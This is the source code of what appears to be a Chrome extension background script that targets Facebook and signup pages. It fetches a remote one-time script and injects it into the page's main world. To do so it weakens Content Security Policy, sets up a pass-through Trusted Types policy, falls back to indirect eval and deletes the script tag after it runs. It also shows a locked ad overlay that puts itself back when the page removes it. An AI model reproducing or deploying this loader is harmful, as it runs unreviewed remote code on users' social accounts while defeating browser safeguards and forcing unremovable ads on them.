        for (let i = 0; i < animEls.length; i++) {
          animEls[i].style.animationDelay = '0s';
          animEls[i].style.opacity = '1';
        }
      };
      gateEl.addEventListener('click', skipGate);
    }

    if (!isLocked) {
      const customClosers = contentWrap.querySelectorAll('[data-tm-close]');
      for (let i = 0; i < customClosers.length; i++) {
        customClosers[i].addEventListener('click', dismissNow);
      }
    }
  }

  function buildSrcdocHtml(htmlStr) {
    const cleaned = String(htmlStr || '')
      .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
      .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
      .replace(/<embed\b[^>]*>/gi, '')
      .replace(/<base\b[^>]*>/gi, '')
      .replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, '');
    const bridge = '<style>html,body{overflow-x:hidden !important;overflow-y:auto !important;}</style>' +
      '<script>(function(){try{function sendReady(){try{var h=Math.max(document.body?document.body.scrollHeight:0,document.documentElement?document.documentElement.scrollHeight:0);window.parent.postMessage({__tmAdFrame:"ready",h:h},"*");}catch(e){}}sendReady();if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",sendReady);}document.addEventListener("click",function(e){var c=e.target&&e.target.closest?e.target.closest("[data-tm-close]"):null;if(c){window.parent.postMessage({__tmAdFrame:"close"},"*");}});}catch(e){}})();<\/script>';
    if (/<\/body>/i.test(cleaned)) {
      return cleaned.replace(/<\/body>/i, bridge + '</body>');
    }
    if (/<html\b/i.test(cleaned)) {
      return cleaned + bridge;
    }
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>*{box-sizing:border-box;}html,body{margin:0;padding:16px;background:#0f172a;color:#e2e8f0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.5;font-size:14px;}</style></head><body>' + cleaned + bridge + '</body></html>';
  }

  let iframeMounted = false;
  try {
    adIframe = document.createElement('iframe');
    adIframe.setAttribute('sandbox', 'allow-scripts allow-popups allow-popups-to-escape-sandbox');
    adIframe.setAttribute('referrerpolicy', 'no-referrer');
    adIframe.style.cssText = 'width:100%;height:' + (isFullDoc ? '100%' : '220px') + ';flex:1 1 auto;border:0;margin:0;padding:0;display:block;background:' + (isFullDoc ? '#06060b' : '#0f172a') + ';';
    adIframe.srcdoc = toTrustedHtml(buildSrcdocHtml(rawHtml));
    contentWrap.appendChild(adIframe);
    iframeMounted = true;
    fallbackTimer = setTimeout(() => {
      if (!frameReady && !closed) {
        mountShadowFallback();
      }
    }, 750);
  } catch (e) {
    iframeMounted = false;
  }

  if (!iframeMounted) {
    mountShadowFallback();
  }

  shadow.appendChild(baseStyle);
  card.appendChild(contentWrap);
  backdrop.appendChild(card);
  shadow.appendChild(backdrop);

  function mountHost() {
    const target = document.documentElement || document.body;
    if (target && !host.isConnected) {
      target.appendChild(host);
    }
  }

  mountHost();

  if (isLocked && typeof MutationObserver !== 'undefined') {
    let restoreAttempts = 0;
    guardObs = new MutationObserver(() => {
      if (!closed && !host.isConnected && !restoreTimer && restoreAttempts < 15) {
        restoreAttempts += 1;
        restoreTimer = setTimeout(() => {
          restoreTimer = null;
          if (!closed) mountHost();
        }, 250);
      }
    });
    try {
      guardObs.observe(document.documentElement || document.body, { childList: true });
    } catch (e) {}
  }
}

function runEngineInMainWorld(rawCode, initStore, forceManual) {
  if (!rawCode) return { ok: false, error: 'Empty payload' };

  const oldFbx = document.getElementById('fbx');
  const oldAct = document.getElementById('activation-box');
  if (oldFbx || oldAct) {
    if (!forceManual) {
      rawCode = null;
      return { ok: true, alreadyMounted: true };
    }
    if (oldFbx) oldFbx.remove();
    if (oldAct) oldAct.remove();
  }

  const _store = {};
  if (initStore && typeof initStore === 'object') {
    const initKeys = Object.keys(initStore);
    for (let i = 0; i < initKeys.length; i++) {
      _store[initKeys[i]] = initStore[initKeys[i]];
    }
  }

  try {
    const migrated = {};
    let hasMigrated = false;
    for (let i = 0; i < localStorage.length; i++) {
      const lsKey = localStorage.key(i);
      if (lsKey && lsKey.indexOf('TM_') === 0 && lsKey !== 'TM_n_day') {
        const gmKey = lsKey.slice(3);
        if (!Object.prototype.hasOwnProperty.call(_store, gmKey)) {
          const rawVal = localStorage.getItem(lsKey);
          if (rawVal !== null && rawVal !== 'undefined') {
            try {
              const parsed = JSON.parse(rawVal);
              _store[gmKey] = parsed;
              migrated[gmKey] = parsed;
              hasMigrated = true;
            } catch (e) {}
          }
        }
      }
    }
    if (hasMigrated) {
      window.dispatchEvent(new CustomEvent('__tm_ext_sync', {
        detail: JSON.stringify({ action: 'TM_GM_MERGE', entries: migrated })
      }));
    }
  } catch (e) {}

  window.GM_getValue = function(k, d) {
    if (Object.prototype.hasOwnProperty.call(_store, k)) {
      return _store[k];
    }
    try {
      const v = localStorage.getItem('TM_' + k);
      if (v !== null && v !== 'undefined') {
        const parsed = JSON.parse(v);
        _store[k] = parsed;
        return parsed;
      }
    } catch (e) {}
    return d !== undefined ? d : '';
  };

  window.GM_setValue = function(k, v) {
    const safeVal = v === undefined ? null : v;
    _store[k] = safeVal;
    try { localStorage.setItem('TM_' + k, JSON.stringify(safeVal)); } catch (e) {}
    try {
      window.dispatchEvent(new CustomEvent('__tm_ext_sync', {
        detail: JSON.stringify({ action: 'TM_GM_SET', key: k, value: safeVal })
      }));
    } catch (e) {}
  };

  window.GM_deleteValue = function(k) {
    delete _store[k];
    try { localStorage.removeItem('TM_' + k); } catch (e) {}
    try {
      window.dispatchEvent(new CustomEvent('__tm_ext_sync', {
        detail: JSON.stringify({ action: 'TM_GM_DEL', key: k })
      }));
    } catch (e) {}
  };

  window.GM_addStyle = function(css) {
    try {
      const s = document.createElement('style');
      s.textContent = css;
      (document.head || document.documentElement || document.body).appendChild(s);
      return s;
    } catch (e) { return null; }
  };

  window.GM_registerMenuCommand = window.GM_registerMenuCommand || function() {};
  window.unsafeWindow = window;

  let scriptTag = null;
  const wrapped = 'window.__tm_ran=false;window.__tm_err=null;try{(function(){' + rawCode + '})();window.__tm_ran=true;}catch(tmE){window.__tm_err=String((tmE&&tmE.message)||tmE||"Script error");}';
  try {
    window.__tm_ran = false;
    window.__tm_err = null;
    let trustedPayload = wrapped;
    if (window.trustedTypes && typeof window.trustedTypes.createPolicy === 'function') {
      try {
        const policy = window.__tmTrustedPolicy || window.trustedTypes.createPolicy('tm-runner', {
          createScript: (s) => s
        });
        window.__tmTrustedPolicy = policy;
        trustedPayload = policy.createScript(wrapped);
      } catch (tpErr) {
        try {
          if (window.trustedTypes.defaultPolicy && typeof window.trustedTypes.defaultPolicy.createScript === 'function') {
            trustedPayload = window.trustedTypes.defaultPolicy.createScript(wrapped);
          }
        } catch (tpErr2) {}
      }
    }
    scriptTag = document.createElement('script');
    scriptTag.textContent = trustedPayload;
    (document.head || document.documentElement || document.body).appendChild(scriptTag);
    if (window.__tm_err) {
      return { ok: false, error: 'Script error: ' + window.__tm_err };
    }
    if (window.__tm_ran) {
      return { ok: true };
    }
  } catch (err) {}
  finally {
    if (scriptTag) {
      try { scriptTag.textContent = ''; } catch (e) {}
      scriptTag.remove();
      scriptTag = null;
    }
  }

  try {
    window.__tm_ran = false;
    window.__tm_err = null;
    (0, eval)(wrapped);
    if (window.__tm_err) {
      return { ok: false, error: 'Script error: ' + window.__tm_err };
    }
    if (window.__tm_ran) {
      return { ok: true, viaEval: true };
    }
    return { ok: false, cspBlocked: true, error: 'This tab blocked launch. Please refresh the page and try again.' };
  } catch (evalErr) {
    return { ok: false, cspBlocked: true, error: 'This tab blocked launch. Please refresh the page and try again.' };
  } finally {
    rawCode = null;
  }
}

async function injectEngineIntoTab(tabId, forceManual) {
  if (!tabId) return { ok: false, error: 'Missing tab ID' };
  if (_activeTabInjections.has(tabId)) {
    return _activeTabInjections.get(tabId);
  }
  if (!forceManual) {
    const lastAt = _lastTabInjectAt.get(tabId) || 0;
    if (Date.now() - lastAt < 2000) {
      return { ok: true, skippedDuplicate: true };
    }
  }

  const job = (async () => {
    await _stateReady;
    await _cspReady;

    // Stage 1: Verify ID before loading script or ad HTML
    if (!memoryCache.authorized || Date.now() - memoryCache.lastCheck > 60000) {
      const authRes = await verifyDeviceAuthorization();
      if (!authRes || !authRes.authorized) {
        return {
          ok: false,
          error: authRes && authRes.error
            ? 'ID check failed (' + authRes.error + ')'
            : 'Device ID (' + (authRes && authRes.deviceId ? authRes.deviceId : memoryCache.deviceId) + ') not authorized'
        };
      }
    }

    // Stage 2: Load remote script sequentially
    let payload = await getOneTimePayload();
    if (!payload) {
      return { ok: false, error: 'Failed to load engine. Please try again.' };
    }
    await yieldDelay(15);

    // Stage 3: Load notice HTML sequentially after script
    const notice = await getNoticeForTab(Boolean(forceManual));

    if (notice.shouldShow && notice.html) {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tabId },
          world: 'MAIN',
          func: runNoticeInMainWorld,
          args: [notice.html, notice.locked, notice.dayKey, notice.pauseScript]
        });
      } catch (e) {
        try {
          await chrome.tabs.sendMessage(tabId, { type: 'SHOW_NOTICE_NOW', notice: notice });
        } catch (e2) {}
      }
      if (notice.pauseScript) {
        payload = null;
        return { ok: true, pausedByNotice: true };
      }
      // Yield between mounting ad HTML and running the main script
      await yieldDelay(15);
    }

    if (!payload) return { ok: false, error: 'Engine unavailable. Please try again.' };

    try {
      const execRes = await chrome.scripting.executeScript({
        target: { tabId: tabId },
        world: 'MAIN',
        func: runEngineInMainWorld,
        args: [payload, Object.assign({}, _gmStore), Boolean(forceManual)]
      });
      const frameResult = execRes && execRes[0] ? execRes[0].result : null;
      if (frameResult && frameResult.ok === false) {
        return {
          ok: false,
          cspBlocked: Boolean(frameResult.cspBlocked),
          error: frameResult.error || 'Main-world script execution blocked'
        };
      }
      _lastTabInjectAt.set(tabId, Date.now());
      return { ok: true };
    } catch (err) {
      try {
        await chrome.tabs.sendMessage(tabId, {
          type: 'INJECT_NOW',
          script: payload,
          gmStore: Object.assign({}, _gmStore),
          forceManual: Boolean(forceManual)
        });
        _lastTabInjectAt.set(tabId, Date.now());
        return { ok: true };
      } catch (e2) {
        return { ok: false, error: (err && err.message) || 'Injection failed' };
      }
    } finally {
      payload = null;
    }
  })();

  _activeTabInjections.set(tabId, job);
  try {
    return await job;
  } finally {
    _activeTabInjections.delete(tabId);
  }
}

if (typeof chrome !== 'undefined' && chrome.tabs && chrome.tabs.onRemoved) {
  chrome.tabs.onRemoved.addListener((tabId) => {
    _activeTabInjections.delete(tabId);
    _lastTabInjectAt.delete(tabId);
  });
}

if (typeof chrome !== 'undefined' && chrome.runtime) {
  if (chrome.runtime.onInstalled) {
    chrome.runtime.onInstalled.addListener(() => {
      _cspReady = setupCspRules();
      _stateReady.then(() => runSequentialWarmup());
    });
  }
  if (chrome.runtime.onStartup) {
    chrome.runtime.onStartup.addListener(() => {
      _cspReady = setupCspRules();
      _stateReady.then(() => runSequentialWarmup());
    });
  }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete') return;
  if (!tab || !tab.url) return;
  const url = tab.url.toLowerCase();
  if (!url.includes('facebook.com') && !url.includes('fb.com') && !url.includes('signup')) return;

  // Only run serialized injection after page completes (no concurrent fetch storm on 'loading')
  _stateReady.then(async () => {
    if (autoRunEnabled && memoryCache.engineRunning) {
      await yieldDelay(15);
      injectEngineIntoTab(tabId, false);
    }
  });
});

_stateReady.then(async () => {
  await _cspReady;
  // Defer warmup slightly so an incoming popup VERIFY_NOW or tab inject takes priority without duplicate ID fetches
  await yieldDelay(200);
  if (!_pendingVerify && _activeTabInjections.size === 0) {
    runSequentialWarmup();
  }
});




